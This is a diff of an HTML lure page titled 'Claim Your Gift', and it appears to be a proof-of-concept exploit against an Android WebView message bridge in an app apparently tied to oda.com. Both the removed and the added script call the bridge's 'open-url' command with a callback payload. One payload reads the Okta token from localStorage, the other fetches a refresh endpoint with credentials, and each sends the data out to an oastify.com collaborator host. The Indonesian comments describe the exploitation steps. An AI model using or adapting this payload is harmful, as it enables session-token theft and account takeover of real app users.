@@ -1,16 +1,36 @@
+<!DOCTYPE html>
 <html>
+<head>
+     <title>Claim Your Gift</title>
+</head>
 <body>
-  <script>
-   window.onload = function() {
-     if (window.AndroidMessageHandler) {
-       // Pivot from attacker.com to trusted oda.com with payload
-       AndroidMessageHandler.postMessage(JSON.stringify({
-         command: "open-url",
-         url: "https://oda.com/no/account/",
-         callbackString: "new Image().src='https://ng785qr1734royd64be9d1dsfjla90xp.oastify.com\@oda.com/?d='+btoa(document.domain+'|'+localStorage.getItem('okta-token-storage'))"
-       }));
-     }
-   };
-  </script>
+     <script>
+         window.onload = function() {
+             // Kita pastikan bridge tersedia
+             if (window.AndroidMessageHandler) {
+                 // ALUR EKSPLOITASI:
+                 // 1. Perintah 'open-url' akan memaksa WebView Oda pindah ke domain oda.com
+                 // 2. 'callbackString' berisi payload pencurian token yang akan dieksekusi 
+                 //    segera setelah navigasi dipicu.
+                 
+                 var burpId = "6r0scpub5r7ov82xaofydx5xwzn5et5hu.oastify.com";
+                 var payload = `
+                     fetch('/api/v1/user/refresh', {credentials: 'include'})
+                     .then(r => r.text())
+                     .then(data => {
+                         // Kirim data sensitif ke Burp Collaborator penyerang
+                         new Image().src = "https://${burpId}/pwned?token=" + btoa(data);
+                     });
+                 `;
+
+                 AndroidMessageHandler.postMessage(JSON.stringify({
+                     command: "open-url",
+                     url: "https://oda.com/no/account/gift-cards/", // Pindah ke domain terpercaya
+                     title: "GIFT_CARD_VALIDATED",
+                     callbackString: payload
+                 }));
+             }
+         };
+     </script>
 </body>
 </html>
